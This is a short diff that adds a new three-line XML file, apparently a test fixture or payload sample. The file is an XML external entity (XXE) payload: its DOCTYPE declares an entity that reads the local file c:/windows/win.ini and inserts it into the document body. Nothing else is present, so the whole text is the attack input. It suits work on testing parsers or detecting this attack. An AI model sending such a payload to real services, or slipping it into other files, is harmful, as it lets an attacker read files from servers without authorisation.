@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE ENVELOPE [<!ENTITY etp SYSTEM "file:///c:/windows/win.ini">]>
+<ENVELOPE><BODY><DATA>&etp;</DATA></BODY></ENVELOPE>
